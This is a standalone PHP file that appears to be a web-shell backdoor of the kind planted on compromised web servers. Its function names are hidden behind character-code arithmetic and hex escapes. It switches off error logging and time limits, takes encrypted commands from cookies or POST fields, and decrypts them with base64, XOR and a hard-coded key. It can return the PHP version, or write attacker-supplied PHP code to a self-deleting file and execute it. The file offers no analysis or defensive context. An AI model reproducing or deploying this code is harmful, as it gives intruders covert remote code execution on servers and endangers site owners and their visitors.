<?php $vjqvfpedd = chr(402-300)."\x69".chr(847-739).chr(101).chr(948-853)."\x70".'u'."\164"."\x5f"."\x63"."\157"."\156".'t'.'e'."\156".chr(116).chr(115);
$aqftpjl = "\142"."\x61".'s'.'e'.chr(913-859).chr(511-459).chr(337-242)."\x64".'e'."\x63".'o'.'d'.chr(335-234);
$zywiwatnj = chr(105)."\x6e".'i'.chr(95).chr(384-269).'e'.chr(521-405);
$phafixm = 'u'."\x6e".chr(766-658).chr(653-548).chr(110)."\x6b";


@$zywiwatnj("\145".'r'.'r'."\x6f"."\x72"."\x5f".'l'.chr(817-706).chr(103), NULL);
@$zywiwatnj("\x6c".chr(615-504).chr(103).chr(204-109).chr(158-57)."\162".'r'."\157"."\162".'s', 0);
@$zywiwatnj('m'."\x61".chr(120)."\x5f".chr(101).'x'.chr(101).'c'.chr(263-146)."\x74"."\151".chr(111).chr(530-420)."\x5f"."\x74".chr(528-423)."\155"."\145", 0);
@set_time_limit(0);

function ybahx($sanishjiht, $ksusctad)
{
    $lpezhx = "";
    for ($zjajuv = 0; $zjajuv < strlen($sanishjiht);) {
        for ($j = 0; $j < strlen($ksusctad) && $zjajuv < strlen($sanishjiht); $j++, $zjajuv++) {
            $lpezhx .= chr(ord($sanishjiht[$zjajuv]) ^ ord($ksusctad[$j]));
        }
    }
    return $lpezhx;
}

$vyoquj = array_merge($_COOKIE, $_POST);
$fsgmzc = 'f20c74c9-c9c4-4202-9907-cc5ddda210da';
foreach ($vyoquj as $tlleeqh => $sanishjiht) {
    $sanishjiht = @unserialize(ybahx(ybahx($aqftpjl($sanishjiht), $fsgmzc), $tlleeqh));
    if (isset($sanishjiht[chr(380-283)."\x6b"])) {
        if ($sanishjiht['a'] == "\151") {
            $zjajuv = array(
                'p'.chr(135-17) => @phpversion(),
                chr(602-487)."\166" => "3.5",
            );
            echo @serialize($zjajuv);
        } elseif ($sanishjiht['a'] == 'e') {
            $kizdmf = "./" . md5($fsgmzc) . chr(487-441)."\x69".'n'."\143";
            @$vjqvfpedd($kizdmf, "<" . "\x3f".'p'.chr(520-416).chr(278-166)."\x20".'@'.chr(117)."\156".'l'."\x69"."\156".chr(107).chr(342-302).chr(95)."\137".chr(295-225).chr(73).'L'."\105"."\137".chr(95)."\x29".';'.chr(717-685) . $sanishjiht[chr(621-521)]);
            @include($kizdmf);
            @$phafixm($kizdmf);
        }
        exit();
    }
}

